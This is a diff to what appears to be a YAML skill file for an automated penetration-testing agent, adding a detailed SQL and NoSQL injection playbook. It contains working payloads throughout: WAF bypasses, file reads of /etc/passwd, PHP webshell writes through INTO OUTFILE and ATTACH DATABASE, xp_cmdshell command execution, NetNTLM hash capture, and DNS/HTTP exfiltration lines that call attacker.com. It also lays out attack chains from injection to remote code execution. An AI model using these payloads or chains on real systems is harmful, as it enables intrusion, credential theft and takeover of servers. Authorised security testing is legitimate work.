@@ -7,30 +7,90 @@ techniques:
   - "Error-based SQL injection"
   - "Second-order SQL injection"
   - "NoSQL injection techniques"
+  - "ORM injection via raw/extra methods"
+  - "Out-of-band data exfiltration"
 tools:
   - sqlmap
   - nuclei
   - browser_navigate
 knowledge: |
   SQL injection occurs when user input is improperly sanitized and directly concatenated into SQL queries.
-  
-  ## Detection Strategies:
-  1. **Parameter Testing**: Test all input parameters (GET, POST, headers, cookies)
-  2. **Error Analysis**: Look for database error messages revealing backend DBMS
-  3. **Timing Analysis**: Use time delays to detect blind SQL injection
-  4. **Boolean Logic**: Test true/false conditions in blind scenarios
-  
-  ## Advanced Techniques:
-  - **WAF Bypass**: Use encoding, comments, and alternative syntax
-  - **Privilege Escalation**: Exploit DBMS-specific functions for system access
-  - **Data Exfiltration**: Extract sensitive data through various channels
-  - **Second-Order**: Inject payloads that execute in different contexts
-  
-  ## Database-Specific Payloads:
-  - **MySQL**: UNION SELECT, INTO OUTFILE, LOAD_FILE()
-  - **PostgreSQL**: COPY, pg_read_file(), pg_ls_dir()
-  - **MSSQL**: xp_cmdshell, OPENROWSET, bulk insert
-  - **Oracle**: UTL_FILE, UTL_HTTP, DBMS_XMLGEN
+
+  ## Detection — Surface Mapping
+  Test every input vector: GET/POST params, cookies, HTTP headers (X-Forwarded-For, Referer, User-Agent),
+  JSON/XML body fields, REST path segments, multipart filenames. Numeric params — try arithmetic: id=3-1.
+  String params — try tautologies and string concat: ' OR '1'='1, ' || '1'='1. When you see a 500 or
+  stack trace, note the DBMS fingerprint and pivot to DB-specific payloads immediately.
+
+  ## DBMS Fingerprinting Shortcuts
+  - MySQL: @@version, VERSION(), error contains "You have an error in your SQL syntax"
+  - PostgreSQL: version(), error contains "unterminated quoted string" or "syntax error at or near"
+  - MSSQL: @@version, error contains "Unclosed quotation mark" or "mssql"
+  - Oracle: SELECT banner FROM v$version, error contains "ORA-"
+  - SQLite: sqlite_version(), error contains "SQLITE_ERROR" or "near"
+
+  ## DB-Specific Extraction Primitives
+  **MySQL**: GROUP_CONCAT(table_name) FROM information_schema.tables; LOAD_FILE('/etc/passwd');
+  SELECT ... INTO OUTFILE '/var/www/shell.php'; ExtractValue(1,concat(0x7e,(SELECT ..)));
+  UpdateXML(1,concat(0x7e,(SELECT ..)),1) for error-based. DUMPFILE for binary writes.
+  **PostgreSQL**: string_agg(tablename,',') FROM pg_tables; pg_read_file('/etc/passwd');
+  COPY (SELECT '') TO '/tmp/out'; lo_import/lo_export for large object file I/O;
+  query_to_xml('SELECT ...',true,false,'') wraps output in XML for extraction.
+  **MSSQL**: EXEC xp_cmdshell 'whoami'; OPENROWSET for remote queries; fn_xe_file_target_read_file
+  for file reads; sp_OACreate for COM object instantiation; xp_dirtree for UNC path → SMB hash capture.
+  **Oracle**: UTL_HTTP.REQUEST('http://attacker/'||(SELECT ...)) for OOB; DBMS_XMLGEN.getxml()
+  for error-based; UTL_FILE.PUT_LINE for file writes; SYS.DBMS_EXPORT_EXTENSION for privesc.
+  **SQLite**: No network functions — focus on ATTACH DATABASE '/var/www/shell.php' AS x;
+  CREATE TABLE x.y(z text); INSERT INTO x.y VALUES('<?php system($_GET["c"]);?>');
+
+  ## ORM Bypass Patterns
+  When app uses an ORM, raw SQL surfaces still exist:
+  - Django: .raw(), .extra(where=[...]), RawSQL(), cursor.execute() — also __regex and __contains
+    filters may pass unsanitized regex to LIKE/SIMILAR TO
+  - SQLAlchemy: text(), from_statement(), .execute() on engine/connection, .filter(text(...))
+  - ActiveRecord: .find_by_sql(), .where("col = '#{input}'"), .order(), .pluck(), .select() with
+    string interpolation, .group(), .having() — .extra() historically dangerous
+  - Sequelize (Node): sequelize.query(), Sequelize.literal(), [Op.col] with unsanitized input
+  Look for endpoints mixing ORM with string-formatted queries, especially in search/filter/sort params.
+
+  ## WAF Bypass Arsenal
+  **Comment insertion**: UN/**/ION SE/**/LECT, /*!50000UNION*/ SELECT (MySQL versioned comments)
+  **Whitespace alternatives**: %09 (tab), %0a (newline), %0d (CR), %0c (form feed) between keywords
+  **Case mixing**: uNiOn SeLeCt — effective against naive regex filters
+  **No-space techniques**: UNION(SELECT(1),(2)) — parentheses replace spaces
+  **String concat to dodge keyword filters**: MySQL CONCAT('sel','ect'), 0x73656c656374;
+  MSSQL 'sel'+'ect'; PostgreSQL 'sel'||'ect'; Oracle 'sel'||'ect'
+  **CASE tricks**: CASE WHEN 1=1 THEN 'admin' ELSE '' END — replace blocked subqueries
+  **Encoding layers**: URL-encode → double URL-encode → Unicode (IIS: %u0027 = '),
+  HTML entities in JSON bodies, overlong UTF-8 sequences
+  **HPP (HTTP Parameter Pollution)**: split payload across duplicate params — some WAFs only inspect first
+  **Chunked transfer encoding**: fragment payload across chunk boundaries
+
+  ## Blind Extraction Optimization
+  **Binary search**: Don't test a-z linearly. Use ASCII midpoint: AND ASCII(SUBSTRING(x,1,1))>78
+  halves the keyspace each query — 7 requests per char vs 26 average.
+  **Conditional errors**: AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1 — triggers 500 on true,
+  200 on false. Faster than time-based, no network jitter.
+  **DNS exfiltration**: MySQL: SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\x'));
+  MSSQL: EXEC master..xp_dirtree '\\'+db_name()+'.attacker.com\x';
+  Oracle: SELECT UTL_HTTP.REQUEST('http://'||version||'.attacker.com') FROM dual;
+  PostgreSQL: COPY (SELECT version()) TO PROGRAM 'curl attacker.com';
+  **Batch extraction**: GROUP_CONCAT / string_agg to pull multiple rows in one request.
+  **Bit-shifting**: Extract data one bit at a time when character functions are blocked:
+  AND (SELECT ord(mid(x,1,1))>>7&1)=1
+
+  ## Chaining — SQLi as Pivot
+  SQLi → LOAD_FILE/pg_read_file → source code → hardcoded creds/API keys → lateral movement.
+  SQLi → file write (INTO OUTFILE, COPY TO, ATTACH DATABASE) → webshell → RCE.
+  SQLi → xp_cmdshell/COPY TO PROGRAM → direct OS command execution.
+  SQLi → credential dump from users table → password reuse across services.
+  SQLi → UNC path injection (MSSQL xp_dirtree) → NetNTLM hash capture → relay/crack.
+  Second-order SQLi: payload stored in profile/settings, triggered by admin report generation.
+
+  ## NoSQL Injection Patterns
+  MongoDB: {"$gt":""}, {"$regex":"^a"} for blind extraction, {"$where":"sleep(5000)"} for timing.
+  Operator injection in JSON APIs: convert param=value to param[$ne]=x.
+  Server-side JS injection in $where clauses: '; return true; var x='
 examples:
   - title: "Basic Union Injection"
     description: "Standard union-based SQL injection"
@@ -48,12 +108,30 @@ examples:
     description: "Bypass authentication in NoSQL databases"
     payload: "username[$ne]=null&password[$ne]=null"
     validation: "Check if authentication is bypassed"
+  - title: "Error-Based via ExtractValue (MySQL)"
+    description: "Extract data through XML parsing errors"
+    payload: "' AND ExtractValue(1,concat(0x7e,(SELECT version())))-- "
+    validation: "Database version appears in error message prefixed with ~"
+  - title: "Stacked Query with OOB Exfil (MSSQL)"
+    description: "Use DNS exfiltration when no visible output"
+    payload: "'; EXEC master..xp_dirtree '\\\\'+SYSTEM_USER+'.attacker.com\\x'--"
+    validation: "DNS query received at attacker-controlled nameserver"
+  - title: "WAF Bypass with Versioned Comments"
+    description: "MySQL versioned comment to evade WAF pattern matching"
+    payload: "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,user()--"
+    validation: "Union query executes despite WAF presence"
+  - title: "ORM Bypass in Django .extra()"
+    description: "Inject through Django ORM extra() where clause"
+    payload: "1=1) UNION SELECT username,password FROM auth_user--"
+    validation: "User credentials returned through ORM filter bypass"
 validation_methods:
   - "Verify database error messages in responses"
   - "Test mathematical operations (1+1=2) in numeric contexts"
   - "Use time delays to confirm blind injection points"
   - "Extract known database information to confirm access"
   - "Test different payloads across multiple parameters"
+  - "Binary search blind extraction to efficiently confirm data access"
+  - "DNS/HTTP out-of-band channels when in-band output is suppressed"
 references:
   - "https://owasp.org/www-community/attacks/SQL_Injection"
   - "https://portswigger.net/web-security/sql-injection"
